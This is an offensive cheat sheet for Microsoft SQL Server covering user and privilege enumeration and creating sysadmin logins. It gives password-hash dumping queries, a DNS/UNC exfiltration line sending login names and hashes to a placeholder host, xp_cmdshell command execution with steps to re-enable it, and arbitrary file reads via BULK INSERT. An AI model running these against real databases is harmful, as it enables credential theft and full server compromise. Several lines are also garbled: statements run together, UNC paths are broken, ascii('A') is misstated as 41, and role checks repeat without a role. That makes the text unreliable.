# MSSQL

## Database commands

### Comments

```
SELECT 1 -- comment
SELECT /*comment*/1
```

### Version

```
SELECT @@version
```

### Users

```
SELECT user_name();
SELECT system_user;
SELECT user;
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
SELECT name FROM master..syslogins
EXEC sp_addlogin '<username>', '<password>'; -- priv
EXEC sp_droplogin '<username>'; -- priv
EXEC master.dbo.sp_addsrvrolemember '<username>', 'sysadmin'; -- priv
SELECT is_srvrolemember('sysadmin');
SELECT is_srvrolemember('sysadmin', '<usrername>');
SELECT name FROM master..syslogins WHERE sysadmin = '1'
```

### Privileges

```
SELECT permission_name FROM master..fn_my_permissions(null, 'DATABASE’);
SELECT permission_name FROM master..fn_my_permissions(null, 'SERVER'); 
SELECT permission_name FROM master..fn_my_permissions('master..syslogins', 'OBJECT'); 
SELECT permission_name FROM master..fn_my_permissions('sa', 'USER');
--who has it?--
SELECT name FROM master..syslogins WHERE denylogin = 0;
SELECT name FROM master..syslogins WHERE hasaccess = 1;
SELECT name FROM master..syslogins WHERE isntname = 0;
SELECT name FROM master..syslogins WHERE isntgroup = 0;
SELECT name FROM master..syslogins WHERE sysadmin = 1;
SELECT name FROM master..syslogins WHERE securityadmin = 1;
SELECT name FROM master..syslogins WHERE serveradmin = 1;
SELECT name FROM master..syslogins WHERE setupadmin = 1;
SELECT name FROM master..syslogins WHERE processadmin = 1;
SELECT name FROM master..syslogins WHERE diskadmin = 1;
SELECT name FROM master..syslogins WHERE dbcreator = 1;
SELECT name FROM master..syslogins WHERE bulkadmin = 1;
--check if user has privilege--
SELECT is_srvrolemember('<name>');
SELECT is_srvrolemember('<name>');
SELECT is_srvrolemember('<name>');
SELECT is_srvrolemember('<name>');
SELECT is_srvrolemember('<name>');
SELECT is_srvrolemember('<name>');
SELECT is_srvrolemember('<name>');
SELECT is_srvrolemember('<name>');
```

### Database info

```
SELECT DB_NAME()
SELECT name FROM master..sysdatabases;
EXEC sp_helpdb master; --location of master.mdf
EXEC sp_helpdb pubs; --location of pubs.mdf
```

#### Default tables

```
northwind
model
msdb
pubs -- not on sql server 2005
tempdb
```

### List tables

```
SELECT name FROM master..sysobjects WHERE xtype = 'U'; -- tables
SELECT name FROM master..sysobjects WHERE xtype = 'V'; -- views
SELECT name FROM <db name>..sysobjects WHERE xtype = 'U';
```

### List columns

```
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '<table>'); -- for the current DB only
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='<table>'; 
```

### Filter table by column name

```
SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%<query>%';;
```

### Access nth row

```
SELECT TOP 1 name FROM (SELECT TOP <nth> name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC;
```

### String operations

```
substring('<str>', <start>, <end>) 
SELECT 6 & 2
SELECT char(0×41)    --'A'
SELECT ascii('A')    --41
Casting	SELECT CAST('1' as int);
SELECT CAST(1 as char)
SELECT 'A' + 'B'            --'AB'
SELECT char(65)+char(66)    --'AB'
```

### Control flow

```
IF (1=1) SELECT 1 ELSE SELECT 2 
SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END -- returns 1
```

### Time delay

```
WAITFOR DELAY '0:0:5' -- pause for 5 seconds
```

### DNS and HTTP

```
SELECT HOST_NAME();
declare @host varchar(800); select @host = name FROM master..syslogins; exec('master..xp_getfiledetails "\' + @host + 'c$boot.ini"'); -- nonpriv, works on 2000declare @host varchar(800); select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.2.<URL>' from sys.sql_logins; exec('xp_fileexist "\' + @host + 'c$boot.ini"');
```

## Passwords

```
SELECT name, password FROM master..sysxlogins;
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins -- priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.
SELECT name, password_hash FROM master.sys.sql_logins ;
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
```

**Format:** SHA1-based

## Vulnerabilities

### RCE

```
EXEC xp_cmdshell '<command>'; 
```

To reactivate the console in case the command fails:

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE; 
```

### Arbitrary file access

```
CREATE TABLE mydata (line varchar(8000));
BULK INSERT mydata FROM '<path to file>';
DROP TABLE mydata;
```







